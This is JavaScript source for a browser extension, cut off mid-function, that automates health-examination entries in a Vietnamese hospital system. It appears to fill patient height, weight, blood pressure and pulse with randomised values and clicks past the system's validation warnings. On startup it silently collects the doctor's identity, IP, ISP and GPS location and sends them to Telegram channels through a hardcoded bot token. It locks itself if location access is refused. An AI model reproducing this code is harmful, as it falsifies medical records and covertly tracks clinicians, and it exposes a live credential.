/**
 * ============================================================================
 * HIS AUTO MEDICAL EXAMINATION EXTENSION (v6.1 - SEPARATE UNLOCK MESSAGE)
 * ============================================================================
 */

(function () {
    "use strict";

    if (window.hasHISExamExtensionInjected) return;
    window.hasHISExamExtensionInjected = true;

    const UNLOCK_PASSWORD = "slhdd";
    let isBatchUnlocked = false;

    // --- CẤU HÌNH TELEGRAM BOT ---
    const TELEGRAM_BOT_TOKEN = "8907367921:AAFq92EwjUATjg5hXnxQdnEfxIXVqCf6xFw";
    const TELEGRAM_CHAT_ID_SUCCESS = "@autoksk";
    const TELEGRAM_CHAT_ID_ERROR = "@loi_khambenh";

    // HÀM LẤY THÔNG TIN BÁC SĨ & PHÒNG KHÁM ĐANG ĐĂNG NHẬP
    const getDoctorInfo = () => {
        try {
            const headerEl = document.querySelector('#table_header td:not([style*="display:none"]) .header_right') || 
                             document.querySelector('#table_header .header_right');
            if (headerEl) {
                const links = headerEl.querySelectorAll('a.mau');
                if (links.length > 0) {
                    const bsName = links[0].textContent.trim();
                    const phongKham = headerEl.querySelector('.tenphongkham')?.textContent.replace('-', '').trim() || '';
                    const tramYTe = links.length >= 3 ? links[2].textContent.trim() : (links[1] ? links[1].textContent.trim() : '');
                    
                    let detail = `Bs. ${bsName}`;
                    const noiLamViec = [phongKham, tramYTe].filter(Boolean).join(' - ');
                    if (noiLamViec) {
                        detail += ` (${noiLamViec})`;
                    }
                    return detail;
                }
            }
        } catch (e) {
            console.error("Lỗi lấy thông tin bác sĩ:", e);
        }
        return "Bs. Không xác định";
    };

    // --- CÁC HÀM LẤY IP, GPS VÀ ĐỊA CHỈ HÀNH CHÍNH ---
    
    // 1. Lấy IP Public và thông tin mạng qua API
    const getNetworkInfo = async () => {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip || 'Không xác định',
                network: data.org || data.asn || 'Không xác định',
                city: data.city || '',
                region: data.region || '',
                country: data.country_name || ''
            };
        } catch (e) {
            try {
                const res2 = await fetch('https://api.ipify.org?format=json');
                const d2 = await res2.json();
                return { ip: d2.ip, network: 'Không xác định', city: '', region: '', country: '' };
            } catch (err) {
                return { ip: 'Không thể lấy IP', network: 'Không xác định', city: '', region: '', country: '' };
            }
        }
    };

    // 2. Lấy tọa độ GPS chính xác từ trình duyệt (Geolocation API)
    const getBrowserCoordinates = () => {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        denied: false
                    });
                },
                (error) => {
                    console.warn("Không thể lấy tọa độ GPS trình duyệt:", error.message);
                    const isDenied = (error.code === error.PERMISSION_DENIED);
                    resolve({ denied: isDenied });
                },
                { timeout: 10000, maximumAge: 60000, enableHighAccuracy: true }
            );
        });
    };

    // 3. Truy nguyên tọa độ GPS thành địa chỉ hành chính chi tiết
    const getAdminAddressFromCoords = async (lat, lon) => {
        try {
            const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=vi`;
            const response = await fetch(url, { headers: { 'User-Agent': 'HIS-Medical-Extension' } });
            const data = await response.json();
            if (data && data.display_name) {
                return data.display_name;
            }
        } catch (e) {
            console.error("Lỗi phân giải địa chỉ hành chính:", e);
        }
        return null;
    };

    // Gửi tin nhắn mới (Trả về message_id)
    const sendTelegramMessage = async (chatId, message) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: chatId,
                text: message,
                parse_mode: "HTML",
                disable_web_page_preview: true
            };
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await response.json();
            if (data && data.ok) {
                return data.result.message_id;
            }
        } catch (err) {
            console.error("Lỗi không thể gửi tin nhắn Telegram:", err);
        }
        return null;
    };

    // Chỉnh sửa tin nhắn Telegram đã gửi trước đó
    const editTelegramMessage = async (chatId, messageId, newText) => {
        if (!chatId || !messageId) return;
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
            const payload = {
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: "HTML",
                disable_web_page_preview: true
            };
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Lỗi không thể sửa tin nhắn Telegram:", err);
        }
    };

    const sendTelegramAlert = async (chatId, message) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: chatId,
                text: message,
                parse_mode: "HTML",
                disable_web_page_preview: true
            };
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Lỗi không thể gửi thông báo Telegram:", err);
        }
    };

    const checkConditionsAndToggle = () => {
        const modal = document.querySelector("#his-exam-form-modal");
        const floatingBtn = document.querySelector("#his-exam-floating-toggle-btn");

        const currentUrl = window.location.href;
        const targetUrlPattern = "yte-camau.vnpthis.vn/web_his/khambenh"; 
        const isCorrectDomain = currentUrl.includes(targetUrlPattern) || currentUrl.includes("khambenh");

        if (!isCorrectDomain) {
            if (modal) modal.style.display = "none";
            if (floatingBtn) floatingBtn.style.display = "none";
            return false;
        }
        return true;
    };

    const STATE = {
        isRunning: false,
        successList: [],
        failedList: [],
        lastActivityTime: Date.now(),
        isAlerting: false,
        startupTelegramMsgId: null 
    };

    const toggleAlertMode = (active) => {
        const modal = document.querySelector("#his-exam-form-modal");
        const floatingBtn = document.querySelector("#his-exam-floating-toggle-btn");
        const header = document.querySelector("#his-exam-drag-handle");
        
        STATE.isAlerting = active;

        if (active) {
            if (modal) modal.classList.add('his-alert-mode');
            if (floatingBtn) floatingBtn.classList.add('his-alert-mode');
            if (header) header.classList.add('his-alert-header');
        } else {
            if (modal) modal.classList.remove('his-alert-mode');
            if (floatingBtn) floatingBtn.classList.remove('his-alert-mode');
            if (header) header.classList.remove('his-alert-header');
        }
    };

    const updateActivity = () => {
        STATE.lastActivityTime = Date.now();
        if (STATE.isAlerting) toggleAlertMode(false);
    };

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const getRandom = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

    const waitUntilDifferentMinute = async (targetMinute, updateLogUI) => {
        if (updateLogUI) updateLogUI(`⏳ Đợi đồng hồ nhảy phút khác phút ${targetMinute} (Tránh trùng giờ)...`);
        while (true) {
            updateActivity();
            const currentMinute = new Date().getMinutes();
            if (currentMinute !== targetMinute) break;
            await sleep(1000);
        }
    };

    const waitForElement = (selector, timeout = 6000) => new Promise((resolve) => {
        const start = Date.now();
        const timer = setInterval(() => {
            const el = document.querySelector(selector);
            if (el && (el.offsetWidth > 0 || el.offsetHeight > 0 || el.offsetParent !== null)) {
                clearInterval(timer);
                resolve(el);
            } else if (Date.now() - start > timeout) {
                clearInterval(timer);
                resolve(null);
            }
        }, 300);
    });

    const closeExamForm = async (updateLogUI) => {
        let btnClose = document.querySelector('.ui-dialog-titlebar-close, .ui-icon-closethick, button.close');
        if (btnClose) {
            if(updateLogUI) updateLogUI("▶️ Click nút (X) để đóng Popup Khám.");
            btnClose.click();
            await sleep(800);
        }
        const openDialog = document.querySelector('.ui-dialog:not([style*="display: none"])');
        if (openDialog) {
            if(updateLogUI) updateLogUI("▶️ Bấm phím 'Esc' để thoát cửa sổ Form.");
            document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', keyCode: 27, bubbles: true }));
            await sleep(800);
        }
    };

    const handleWarningAndCancel = async (updateLogUI) => {
        const popupContainer = document.querySelector('#popup_container');
        if (popupContainer && (popupContainer.offsetWidth > 0 || popupContainer.offsetHeight > 0)) {
            const msgEl = popupContainer.querySelector('#popup_message');
            const titleEl = popupContainer.querySelector('#popup_title');
            const msgText = `${titleEl ? titleEl.textContent : ''} ${msgEl ? msgEl.textContent : ''}`.trim();
            
            if (msgText.includes("Chưa nhập cân nặng") || 
                msgText.includes("Chẩn đoán ICD") || 
                msgText.includes("Vui lòng kiểm tra lại Chẩn đoán ICD") ||
                msgText.includes("Cảnh báo")) {
                
                if (updateLogUI) updateLogUI(`⚠️ Bảng Cảnh báo: "${msgEl ? msgEl.textContent.trim() : msgText}".`);
                
                const btnOk = popupContainer.querySelector('#popup_ok');
                if (btnOk) {
                    if (updateLogUI) updateLogUI(">> Click 'Đồng ý' trên cảnh báo.");
                    btnOk.click();
                    await sleep(800);
                }

                await closeExamForm(updateLogUI);

                const btnHuy = document.querySelector('#huy, input[name="huy"]');
                if (btnHuy && !btnHuy.disabled && !btnHuy.classList.contains('button_disabled')) {
                    if (updateLogUI) updateLogUI(">> Click 'Hủy' để thoát ca khám lỗi.");
                    btnHuy.click();
                    await sleep(1000);
                }
                return true;
            }
        }
        return false;
    };

    const handleDuplicateTimeErrorPopup = async (updateLogUI) => {
        const jconfirmBox = document.querySelector('.jconfirm-box.jconfirm-type-red, .jconfirm-box');
        if (jconfirmBox && jconfirmBox.offsetWidth > 0 && jconfirmBox.offsetHeight > 0) {
            const boxText = jconfirmBox.innerText || "";
            if (boxText.includes("Dữ liệu không hợp lệ") || boxText.includes("Trùng giờ khám")) {
                if (updateLogUI) updateLogUI("⚠️ Phát hiện cảnh báo Trùng giờ khám!");
                const okBtn = jconfirmBox.querySelector('.jconfirm-buttons button, .btn-default') || jconfirmBox.querySelector('.jconfirm-closeIcon');
                if (okBtn) {
                    if (updateLogUI) updateLogUI(">> Click đóng popup báo Trùng giờ.");
                    okBtn.click();
                    await sleep(800);
                }
                return true;
            }
        }
        return false;
    };

    const handlePopupOk = async (maxWaitMs = 3000, updateLogUI) => {
        const start = Date.now();
        while (Date.now() - start < maxWaitMs) {
            const isWarning = await handleWarningAndCancel(updateLogUI);
            if (isWarning) return 'WARNING_RESET';

            const isDupError = await handleDuplicateTimeErrorPopup(updateLogUI);
            if (isDupError) return 'DUPLICATE_ERROR';

            const btnOk = document.querySelector('#popup_ok, button[id*="popup_ok"], .ui-dialog-buttonpane button');
            if (btnOk && (btnOk.offsetWidth > 0 || btnOk.offsetHeight > 0)) {
                btnOk.click();
                if (updateLogUI) updateLogUI(">> Bấm 'OK/Đồng ý' để bỏ qua popup thông báo.");
                await sleep(800);
                return true;
            }
            await sleep(300);
        }
        return false;
    };

    const saveAndAcceptPopup = async (updateLogUI) => {
        const btnLuu = await waitForElement('#tt32_mau2luuthongtin', 4000);
        if (btnLuu) {
            if(updateLogUI) updateLogUI("▶️ Click nút Lưu thông tin (Hình Đĩa mềm).");
            btnLuu.click();
            await sleep(800);
            
            const isWarn = await handleWarningAndCancel(updateLogUI);
            if (isWarn) return 'WARNING_RESET';

            const result = await handlePopupOk(4000, updateLogUI);
            await sleep(500);
            return result;
        }
        return false;
    };

    const switchTabSafe = async (tabSelector, targetContentSelector) => {
        const tabEl = await waitForElement(tabSelector, 5000);
        if (!tabEl) return false;

        tabEl.click();
        if (window.jQuery) window.jQuery(tabSelector).trigger('click');
        await sleep(800);

        if (targetContentSelector) {
            const contentEl = await waitForElement(targetContentSelector, 4000);
            if (!contentEl) {
                tabEl.click();
                await sleep(1000);
            }
        }
        await sleep(1200);
        return true;
    };

    const setValueSafe = async (selector, val) => {
        const el = await waitForElement(selector, 3000);
        if (!el) return false;
        el.value = val;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
        el.dispatchEvent(new Event('blur', { bubbles: true }));
        await sleep(300);
        return true;
    };

    const setICDAndPressEnter = async (selector, icdCode) => {
        const el = await waitForElement(selector, 4000);
        if (!el) return false;

        el.focus();
        el.value = icdCode;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
        await sleep(300);

        [
            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
        ].forEach(evt => el.dispatchEvent(evt));
        await sleep(800);
        return true;
    };

    const checkAndRecoverIfStuck = async (updateLogUI) => {
        const btnKham = document.querySelector('#kham');
        const btnSua = document.querySelector('#sua');
        const btnLuu = document.querySelector('#luu');
        const btnHuy = document.querySelector('#huy');

        const isButtonDisabled = (btn) => btn && (btn.disabled || btn.classList.contains('button_disabled'));

        if (btnKham && btnSua && btnLuu && btnHuy) {
            if (isButtonDisabled(btnKham) && isButtonDisabled(btnSua) && isButtonDisabled(btnLuu) && isButtonDisabled(btnHuy)) {
                updateLogUI("⚠️ Hệ thống bị đơ (4 nút vô hiệu hóa). Bắt đầu kích hoạt Reset...");
                
                const bsInfo = getDoctorInfo();
                sendTelegramAlert(TELEGRAM_CHAT_ID_ERROR, `⚠️ <b>HỆ THỐNG BỊ LỖI GIAO DIỆN (ĐƠ 4 NÚT)!</b>\n👨‍⚕️ <b>Tài khoản:</b> ${bsInfo}\nPhát hiện 4 nút Khám/Sửa/Lưu/Hủy đều bị xám.\nTool đang tự động thử Reset lại luồng cho ca hiện tại.`);

                const radioDaKham = document.querySelector('input[name="trangthaikham"][value="3"]');
                if (radioDaKham) {
                    radioDaKham.click();
                    radioDaKham.dispatchEvent(new Event('change', { bubbles: true }));
                    updateLogUI(">> Click Checkbox 'Đã khám'. Đợi 4 giây...");
                    await sleep(4000);
                }

                const radioChoKham = document.querySelector('input[name="trangthaikham"][value="1"]');
                if (radioChoKham) {
                    radioChoKham.click();
                    radioChoKham.dispatchEvent(new Event('change', { bubbles: true }));
                    updateLogUI(">> Click Checkbox 'Chờ khám'. Bắt đầu làm mới...");
                    await sleep(1500);
                }
                return true;
            }
        }
        return false;
    };

    const copyPatientNamesToClipboard = async () => {
        if (STATE.successList.length === 0) {
            alert("Chưa có tên bệnh nhân thành công nào để sao chép!");
            return;
        }
        const namesText = STATE.successList.map(item => item.ten).join('\n');
        try {
            await navigator.clipboard.writeText(namesText);
            alert(`Đã sao chép thành công ${STATE.successList.length} tên bệnh nhân!`);
        } catch (err) {
            const textarea = document.createElement('textarea');
            textarea.value = namesText;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert(`Đã sao chép ${STATE.successList.length} tên bệnh nhân!`);
        }
    };

    // --- GỬI THÔNG BÁO KÈM IP, WIFI/MẠNG VÀ GOOGLE MAPS LINK KHI KHỞI ĐỘNG ---
    const sendStartupNotification = async () => {
        await sleep(1500);
        const bsInfo = getDoctorInfo();
        
        const [netInfo, coords] = await Promise.all([
            getNetworkInfo(),
            getBrowserCoordinates()
        ]);

        // Xử lý trường hợp bác sĩ bấm chặn quyền định vị GPS
        if (coords && coords.denied) {
            isBatchUnlocked = false; 
            
            const lockContainer = document.querySelector("#exam-lock-container");
            const controlContainer = document.querySelector("#exam-control-container");
            if (lockContainer) lockContainer.style.display = "block";
            if (controlContainer) controlContainer.style.display = "none";

            const unlockError = document.querySelector("#exam-unlock-error");
            if (unlockError) {
                unlockError.innerHTML = `⚠️ Bạn đã từ chối quyền vị trí! Vui lòng liên hệ admin <a href="tel:0939262443" style="color: #0284c7; font-weight: bold;">Sơn Lý Hồng Đức (093.9262.443)</a> để được mở khóa.`;
            }

            const errorMsg = `❌ <b>BÁC SĨ TỪ CHỐI QUYỀN TRUY CẬP VỊ TRÍ!</b>\n👨‍⚕️ <b>Tài khoản:</b> ${bsInfo}\n🌐 <b>IP:</b> ${netInfo.ip}\n⚠️ Extention đã bị khóa. Vui lòng liên hệ admin <b>Sơn Lý Hồng Đức (093.9262.443)</b> để được hỗ trợ mở khóa.`;
            await sendTelegramAlert(TELEGRAM_CHAT_ID_ERROR, errorMsg);
            return;
        }

        let locationStr = "Không xác định";
        let gpsCoordStr = "";

        if (coords && !coords.denied) {
            const mapsUrl = `https://www.google.com/maps?q=${coords.lat},${coords.lon}`;
            gpsCoordStr = `📍 <b>Tọa độ:</b> <a href="${mapsUrl}">Xem vị trí</a>`;
            
            const adminAddress = await getAdminAddressFromCoords(coords.lat, coords.lon);
            if (adminAddress) {
                locationStr = adminAddress;
            } else {
                locationStr = `Lat: ${coords.lat.toFixed(4)}, Lon:${coords.lon.toFixed(4)}`;
            }
        } else if (netInfo.city || netInfo.region) {
            locationStr = `${netInfo.city}, ${netInfo.region},${netInfo.country}`;
        }

        let msg = `🟢 <b>${bsInfo} đang hoạt động</b>\n` +
                  `🌐 <b>IP Address:</b> ${netInfo.ip}\n` +
                  `🛜 <b>Nhà mạng/Wifi:</b> ${netInfo.network}\n` +
                  (gpsCoordStr ? `${gpsCoordStr}\n` : ``) +
                  `🗺️ <b>Khu vực/Địa chỉ:</b> ${locationStr}`;

        STATE.startupTelegramMsgId = await sendTelegramMessage(TELEGRAM_CHAT_ID_SUCCESS, msg);
    };

    const createUIModal = () => {
        if (!checkConditionsAndToggle()) return;
        if (document.querySelector("#his-exam-form-modal")) return;

        sendStartupNotification();

        const modalStyle = `
            <style>
                @keyframes pulseRedAlert {
                    0% { border-color: #ef4444; box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
                    50% { border-color: #dc2626; box-shadow: 0 0 30px 15px rgba(239, 68, 68, 0.6); }
                    100% { border-color: #ef4444; box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
                }
                .his-alert-mode { animation: pulseRedAlert 1.2s infinite !important; border: 2px solid #ef4444 !important; }
                .his-alert-header { background: linear-gradient(135deg, #ef4444 0%, #991b1b 100%) !important; }

                #his-exam-form-modal {
                    position: fixed; bottom: 24px; right: 24px; z-index: 999999;
                    background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px);
                    border-radius: 14px; box-shadow: 0 14px 40px rgba(0, 0, 0, 0.2), 0 4px 10px rgba(0, 0, 0, 0.1);
                    width: 440px; font-family: system-ui, -apple-system, sans-serif;
                    overflow: hidden; border: 1px solid rgba(226, 232, 240, 0.9); transition: all 0.3s ease;
                }
                .his-modal-header {
                    background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%); color: #ffffff;
                    padding: 12px 16px; display: flex; justify-content: space-between; align-items: center;
                    cursor: move; user-select: none; transition: background 0.3s ease;
                }
                .his-modal-header .title-group { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; }
                .his-modal-header .btn-close {
                    background: rgba(255, 255, 255, 0.15); border: none; color: #ffffff;
                    width: 26px; height: 26px; border-radius: 50%; font-size: 13px; cursor: pointer;
                    display: flex; align-items: center; justify-content: center; transition: all 0.2s;
                }
                .his-modal-header .btn-close:hover { background: #ef4444; transform: scale(1.1); }
                .his-modal-body { padding: 16px; background: transparent; max-height: 85vh; overflow-y: auto; }
                .his-input {
                    width: 100%; padding: 8px 10px; font-size: 13px; border: 1px solid #cbd5e1;
                    border-radius: 8px; background: #ffffff; outline: none; box-sizing: border-box; margin-bottom: 8px;
                }
                .his-input:focus { border-color: #0284c7; box-shadow: 0 0 0 2px rgba(2, 132, 199, 0.2); }
                .config-section { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 8px; padding: 10px; margin-bottom: 10px; }
                .config-title { font-size: 11px; font-weight: 700; color: #0369a1; margin-bottom: 6px; text-transform: uppercase; }
                .config-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
                .config-item label { display: block; font-size: 10px; color: #64748b; margin-bottom: 2px; }
                .config-item input { width: 100%; padding: 5px; font-size: 11px; border: 1px solid #cbd5e1; border-radius: 6px; text-align: center; box-sizing: border-box; }
                .his-btn-main {
                    width: 100%; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: #ffffff;
                    border: none; padding: 10px; border-radius: 8px; font-weight: 700; font-size: 13px;
                    cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
                    box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); margin-bottom: 8px; transition: all 0.2s;
                }
                .his-btn-main:hover { transform: translateY(-1px); box-shadow: 0 6px 15px rgba(16, 185, 129, 0.4); }
                
                .his-status-box {
                    background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 8px 10px;
                    font-size: 11px; color: #10b981; margin-top: 10px; height: 180px; 
                    overflow-y: auto; font-family: 'Consolas', monospace; box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
                    line-height: 1.4;
                }
                .log-row {
                    display: grid;
                    grid-template-columns: 60px 1fr;
                    gap: 8px;
                    border-bottom: 1px dashed rgba(51, 65, 85, 0.6);
                    padding: 5px 0;
                }
                .log-row:last-child { border-bottom: none; }
                .log-time { color: #64748b; font-size: 10px; user-select: none; }
                .log-msg { word-break: break-word; }

                .his-sub-tabs-container { margin-top: 10px; border-top: 1px solid #e2e8f0; padding-top: 8px; }
                .his-sub-tabs-header { display: flex; gap: 6px; margin-bottom: 6px; }
                .his-sub-tab-btn {
                    flex: 1; background: #f1f5f9; border: 1px solid #cbd5e1; padding: 4px;
                    font-size: 11px; font-weight: 700; border-radius: 6px; cursor: pointer; color: #475569; transition: all 0.2s;
                }
                .his-sub-tab-btn.active-success { background: #dcfce7; color: #15803d; border-color: #86efac; }
                .his-sub-tab-btn.active-failed { background: #fee2e2; color: #b91c1c; border-color: #fca5a5; }
                .his-sub-pane { display: none; height: 80px; overflow-y: auto; background: #ffffff; border: 1px solid #cbd5e1; border-radius: 6px; padding: 6px; font-size: 11px; }
                .his-sub-pane.active { display: block; }
                .his-btn-copy { width: 100%; background: #0284c7; color: #ffffff; border: none; padding: 8px; border-radius: 6px; font-weight: 700; font-size: 11px; cursor: pointer; margin-top: 6px; }
                .his-btn-copy:hover { background: #0369a1; }
                #his-exam-floating-toggle-btn {
                    position: fixed; bottom: 24px; right: 24px; z-index: 999998;
                    background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none;
                    width: 55px; height: 55px; border-radius: 50%; box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
                    cursor: pointer; display: none; align-items: center; justify-content: center; transition: all 0.3s ease;
                }
                #his-exam-floating-toggle-btn:hover { transform: scale(1.05); }
            </style>
        `;

        const modalHtml = `
            <div id="his-exam-form-modal">
                ${modalStyle}
                <div class="his-modal-header" id="his-exam-drag-handle">
                    <div class="title-group">
                        <img src="${chrome.runtime.getURL("icon.png")}" alt="Logo" style="width: 22px; height: 22px; object-fit: contain; border-radius: 4px;" onerror="this.style.display='none'">
                        <span>KHÁM SỨC KHỎE TỰ ĐỘNG</span>
                    </div>
                    <button id="his-exam-btn-close-ui" class="btn-close" title="Ẩn cửa sổ">✕</button>
                </div>

                <div class="his-modal-body">
                    <div id="exam-lock-container" style="text-align: center; padding: 20px 10px; background: #f1f5f9; border-radius: 8px; border: 1px dashed #cbd5e1;">
                        <div style="font-size: 12px; font-weight: 700; color: #b91c1c; margin-bottom: 6px;">🔒 Xác thực hệ thống</div>
                        <div style="font-size: 11px; color: #64748b; margin-bottom: 8px;">Nhập mật khẩu để mở khóa:</div>
                        <input type="password" id="exam-pwd-input" class="his-input" value="slhdd" placeholder="Mật khẩu...">
                        <button type="button" id="btn-unlock-exam" style="width: 100%; background: #0284c7; color: white; border: none; padding: 7px; border-radius: 6px; font-weight: 700; cursor: pointer; font-size: 12px;">Mở Khóa</button>
                        <div id="exam-unlock-error" style="color: #dc2626; font-size: 10px; margin-top: 6px; min-height: 14px; line-height: 1.4;"></div>
                    </div>

                    <div id="exam-control-container" style="display: none;">
                        <div class="config-section">
                            <div class="config-title">⚙️ Cấu hình Thể lực & Sinh hiệu</div>
                            <div class="config-grid">
                                <div class="config-item"><label>Chiều cao (cm)</label><div style="display: flex; gap: 4px;"><input type="number" id="cfg-cc-min" value="150"><input type="number" id="cfg-cc-max" value="180"></div></div>
                                <div class="config-item"><label>Cân nặng (kg)</label><div style="display: flex; gap: 4px;"><input type="number" id="cfg-cn-min" value="45"><input type="number" id="cfg-cn-max" value="70"></div></div>
                                <div class="config-item"><label>Huyết áp cao</label><div style="display: flex; gap: 4px;"><input type="number" id="cfg-hac-min" value="110"><input type="number" id="cfg-hac-max" value="130"></div></div>
                                <div class="config-item"><label>Huyết áp thấp</label><div style="display: flex; gap: 4px;"><input type="number" id="cfg-hat-min" value="70"><input type="number" id="cfg-hat-max" value="80"></div></div>
                                <div class="config-item" style="grid-column: span 2;"><label>Mạch (lần/phút)</label><div style="display: flex; gap: 4px;"><input type="number" id="cfg-mach-min" value="65"><input type="number" id="cfg-mach-max" value="90"></div></div>
                            </div>
                        </div>

                        <button id="btn-start-ksk" class="his-btn-main">
                            <span>🚀</span><span>Bắt Đầu Khám Tự Động</span>
                        </button>
                        <button id="btn-stop-ksk" class="his-btn-main" style="background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); display: none;">
                            <span>⏹</span><span>Dừng Lại</span>
                        </button>
                        
                        <div class="his-status-box" id="exam-live-log">
                            <div class="log-row">
                                <div class="log-time">[--:--:--]</div>
                                <div class="log-msg"><span style="color: #10b981;">[HỆ THỐNG] Sẵn sàng thực hiện khám tự động...</span></div>
                            </div>
                        </div>

                        <div class="his-sub-tabs-container">
                            <div class="his-sub-tabs-header">
                                <button class="his-sub-tab-btn active-success" id="exam-sub-success">Thành công (<span id="exam-cnt-success">0</span>)</button>
                                <button class="his-sub-tab-btn" id="exam-sub-failed">Thất bại (<span id="exam-cnt-failed">0</span>)</button>
                            </div>
                            <div id="exam-pane-success" class="his-sub-pane active">
                                <div style="color: #94a3b8; text-align: center; padding: 20px 0; font-style: italic;">Chưa có ca nào</div>
                            </div>
                            <div id="exam-pane-failed" class="his-sub-pane">
                                <div style="color: #94a3b8; text-align: center; padding: 20px 0; font-style: italic;">Chưa có ca lỗi</div>
                            </div>
                            <button id="his-exam-btn-copy-names" class="his-btn-copy">
                                📋 Sao Chép Tên BN Thành Công
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <button id="his-exam-floating-toggle-btn" title="Mở bảng Khám sức khỏe">
                <img src="${chrome.runtime.getURL("icon.png")}" alt="Logo" style="width: 30px; height: 30px; object-fit: contain; border-radius: 4px;" onerror="this.style.display='none'">
            </button>
        `;

        document.body.insertAdjacentHTML('beforeend', modalHtml);

        const modal = document.querySelector("#his-exam-form-modal");
        const dragHandle = document.querySelector("#his-exam-drag-handle");
        let isDragging = false, startX, startY, initialX, initialY;

        dragHandle.addEventListener("mousedown", (e) => {
            isDragging = true;
            startX = e.clientX;
            startY = e.clientY;
            const rect = modal.getBoundingClientRect();
            initialX = rect.left;
            initialY = rect.top;
            modal.style.bottom = "auto";
            modal.style.right = "auto";
            modal.style.left = `${initialX}px`;
            modal.style.top = `${initialY}px`;
            e.preventDefault();
        });
        document.addEventListener("mousemove", (e) => {
            if (!isDragging) return;
            modal.style.left = `${initialX + (e.clientX - startX)}px`;
            modal.style.top = `${initialY + (e.clientY - startY)}px`;
        });
        document.addEventListener("mouseup", () => { isDragging = false; });

        const btnUnlock = document.querySelector("#btn-unlock-exam");
        const pwdInput = document.querySelector("#exam-pwd-input");
        const unlockError = document.querySelector("#exam-unlock-error");
        const lockContainer = document.querySelector("#exam-lock-container");
        const controlContainer = document.querySelector("#exam-control-container");

        if (isBatchUnlocked) {
            lockContainer.style.display = "none";
            controlContainer.style.display = "block";
        }

        const handleUnlock = async () => {
            if (pwdInput.value.trim() === UNLOCK_PASSWORD) {
                isBatchUnlocked = true;
                lockContainer.style.display = "none";
                controlContainer.style.display = "block";

                const bsInfo = getDoctorInfo();
                
                // Gửi một tin nhắn RIÊNG BIỆT xác nhận giải mã/mở khóa thành công
                const successUnlockText = `🔓 <b>GIẢI MÃ THÀNH CÔNG!</b>\n👨‍⚕️ <b>Tài khoản:</b> ${bsInfo}\n✅ Extension đã được mở khóa và sẵn sàng hoạt động.`;
                await sendTelegramAlert(TELEGRAM_CHAT_ID_SUCCESS, successUnlockText);

            } else {
                unlockError.innerHTML = `Sai mật khẩu! Vui lòng liên hệ admin <a href="tel:0939262443" style="color: #0284c7; font-weight: bold;">Sơn Lý Hồng Đức (093.9262.443)</a> để được mở khóa.`;
                pwdInput.focus();
            }
        };

        btnUnlock.addEventListener("click", handleUnlock);
        pwdInput.addEventListener("keydown", (e) => { if (e.key === 'Enter') handleUnlock(); });

        const btnSubSuccess = document.querySelector("#exam-sub-success");
        const btnSubFailed = document.querySelector("#exam-sub-failed");
        const paneSuccess = document.querySelector("#exam-pane-success");
        const paneFailed = document.querySelector("#exam-pane-failed");

        btnSubSuccess.addEventListener("click", () => {
            btnSubSuccess.classList.add("active-success");
            btnSubFailed.classList.remove("active-failed");
            paneSuccess.classList.add("active");
            paneFailed.classList.remove("active");
        });
        btnSubFailed.addEventListener("click", () => {
            btnSubFailed.classList.add("active-failed");
            btnSubSuccess.classList.remove("active-success");
            paneFailed.classList.add("active");
            paneSuccess.classList.remove("active");
        });

        const updateLogUI = (msg) => {
            const liveLog = document.querySelector("#exam-live-log");
            if (liveLog) {
                let colorMsg = msg;
                if (msg.includes("⚠️") || msg.includes("🆘")) colorMsg = `<span style="color: #ef4444;">${msg}</span>`;
                else if (msg.includes("✅")) colorMsg = `<span style="color: #10b981; font-weight: bold;">${msg}</span>`;
                else if (msg.includes("❌")) colorMsg = `<span style="color: #f43f5e; font-weight: bold;">${msg}</span>`;
                else if (msg.includes("▶️") || msg.includes(">>")) colorMsg = `<span style="color: #94a3b8;">${msg}</span>`;
                else colorMsg = `<span style="color: #e2e8f0;">${msg}</span>`;
                
